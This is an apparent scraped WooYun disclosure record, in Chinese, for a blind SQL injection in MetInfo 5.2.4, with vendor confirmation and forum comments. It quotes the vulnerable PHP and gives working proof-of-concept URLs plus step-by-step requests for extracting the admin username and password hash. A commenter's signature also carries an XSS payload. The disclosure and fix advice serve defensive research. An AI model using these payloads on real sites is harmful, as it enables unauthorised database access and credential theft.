{"id": 3209, "wybug_id": "wooyun-2014-055338", "wybug_title": "MetInfo最新版(5.2.4)一处SQL盲注漏洞", "wybug_corp": "MetInfo", "wybug_author": "Mody", "wybug_date": "2014-04-02 17:50", "wybug_open_date": "2014-07-01 17:51", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["变量覆盖", "盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向公众公开  简要描述： 上周三挖了个metinfo的后台文件包含，被乌云大大给忽略了，好吧，我承认那个洞的确太难用了。。。今天刚挖到一处sql注入，就屁颠屁颠的来乌云提交了，求乌云大大给过，我不要继续当路人甲阿。。。还是上次那句话，貌似metinfo都交给cncert了，弱弱问下，那还有通用性奖励么？WooYun回答：有！ 详细说明：  借用 WooYun: metinfo多个漏洞(可getshell) 的一句话：审计代码我一般喜欢先看核心文件1. 来看核心的文件admin/include/common.inc.php(下面的代码有我自己添加的调试代码)\n/* * added by mody * glocal register *///print '-----------global register----------<br>';foreach(array('_COOKIE', '_POST', '_GET') as $_request) {\tforeach($$_request as $_key => $_value) {\t\t$_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);\t\t/*\t\tif(is_array($$_key)){\t\t\tprint '$'.$_key.'=';\t\t\tprint_r($$_key);\t\t\tprint '<br>';\t\t}\t\telse print '$'.$_key.'='.$$_key.';<br>';\t\t*/\t}}//print '-----------------------------------<br>';\n注册全局变量，可以看到所有的变量都经过了daddslashes()过滤2. 来看看daddslashes()函数，在文件admin/include/global.func.php\n/*POST变量转换*/function daddslashes($string, $force = 0 ,$sql_injection =0,$url =0){\t!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\tif(!MAGIC_QUOTES_GPC || $force) {\t\tif(is_array($string)) {\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t} else {\t\t\t$string = addslashes($string);\t\t}\t}\tif(is_array($string)){\t\tif($url){\t\t\t//$string='';\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t}else{\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t}\t}else{\t\tif(SQL_DETECT!=1 || $sql_injection==1){\t\t\t$string = str_ireplace(\"\\\"\",\"/\",$string);\t\t\t$string = str_ireplace(\"'\",\"/\",$string);\t\t\t$string = str_ireplace(\"*\",\"/\",$string);\t\t\t$string = str_ireplace(\"~\",\"/\",$string);\t\t\t$string = str_ireplace(\"select\", \"\\sel\\ect\", $string);\t\t\t$string = str_ireplace(\"insert\", \"\\ins\\ert\", $string);\t\t\t$string = str_ireplace(\"update\", \"\\up\\date\", $string);\t\t\t$string = str_ireplace(\"delete\", \"\\de\\lete\", $string);\t\t\t$string = str_ireplace(\"union\", \"\\un\\ion\", $string);\t\t\t$string = str_ireplace(\"into\", \"\\in\\to\", $string);\t\t\t$string = str_ireplace(\"load_file\", \"\\load\\_\\file\", $string);\t\t\t$string = str_ireplace(\"outfile\", \"\\out\\file\", $string);\t\t\t$string = str_ireplace(\"sleep\", \"\\sle\\ep\", $string);\t\t\t$string_html=$string;\t\t\t$string = strip_tags($string);\t\t\tif($string_html!=$string){\t\t\t\t$string='';\t\t\t}\t\t\t$string = str_replace(\"%\", \"\\%\", $string);     //   \t\t}\t}\treturn $string;}\n可以看到，是能够传递array变量进来的（前台的include/include/global.func.php 不能）3. 注入点admin/content/feedback/export.php，这里有亮点啊这个文件包含了admin/include/common.inc.php，但是却没有进行login_check，所以导致这个文件能够不登录直接访问。如下：\n<?php# MetInfo Enterprise Content Management System # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \tob_start();\t$depth='../';\trequire_once $depth.'../include/common.inc.php';\tob_clean();\tob_start();\n接着他进行了一项很危险的操作：\nforeach($settings_arr as $key=>$val){\t\tif($val['columnid']==$class1){\t\t\t$tingname    =$val['name'].'_'.$val['columnid'];   //这里导致变量名必须含有下划线的都可以被覆盖\t\t\t$$val['name']=$$tingname;\t\t}\t}\n其中,$settings_arr,$class1都可以在common.inc.php中被覆盖，这就导致可以构造一定格式的变量（变量名必须要有下划线）那么，如何利用，我们来找下面的sql语句，总共有三句，找第一句即可\n$query = \"SELECT * FROM $met_parameter where module=8 and lang='$lang' order by no_order\";          //>>>>注意，$met_parameter是在$settings_arr后被初始化的，不能直接覆盖，但是可以结合上面的危险操作，进行覆盖<<<<\t//print $query.'<br>';\t//die();\t$result = $db->query($query);\twhile($list= $db->fetch_array($result)){\t\t/*\t\tprint '<br><br>$list=';\t\tprint_r($list);\t\t*/\t\t$feedbackpara[$list['id']]=$list;  // 注意这里的id\t\t$feedback_para[]=$list;\t}\n/////////////////////////////我是猥琐的poc（其中的met_admin_table的met为metinfo自定义的前缀，可以用户自定义）http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter/////////////////////////////对于查询的到的结果，会写入excel文件内，但是因为列名是规定得死死的，不能直接把admin_table表的password列直接写进excel，但是id是可以的，这就足够进行盲注了   漏洞证明：  验证漏洞的存在：1. 其中met_为我实验环境metinfo的前缀（若要复线请根据实际情况修改）， admin_id=0x61646d696e 为字符串'admin'(过滤了单引号)http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696e -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter然后测试一组错误的,把'admin'改成'admil'试试http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696c -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter结果对比图如下\n\n\n\n可以看到两个文件的大小是不一样滴，给大家看看这个excel里到底有啥区别\n\nstep1：暴力破解metinfo前缀用brup进行破解，这个不用我多解释了把，根据返回大小http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameterstep2： 破解admin账户还是brup，用substr 一个个来http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where substr(admin_id,1,1)=0x61 -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameterstep3：破解admin密码同上http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696e and substr(admin_pass,1,1)=0x32 -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter   修复方案：  1. include check_login2. export.php的那个危险的$$注意下3. 打赏点rank吧，我不用当路人甲阿。。。   版权声明：转载请注明来源 Mody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-04-07 08:33 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-02 17:58 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  2.5.4？  还是5.2.4？    \n     2014-04-02 17:59 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @′  雨。 好吧，我错了，是5.2.4@Finger@疯狗，求改过来。。。    \n     2014-04-02 18:07 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  关注    \n     2014-04-02 18:18 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n 师傅 你太调皮了。    \n     2014-05-01 10:33 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @xsser @疯狗 这个有木有$$呢。。。等得我好心焦啊    \n     2014-05-04 11:56 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Mody 有~    \n     2014-05-04 12:09 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @疯狗 有我就放心了，多谢狗哥，么么哒    \n     2014-10-10 18:25 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 带我玩)\t\t \n  学习了...这个很牛x    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}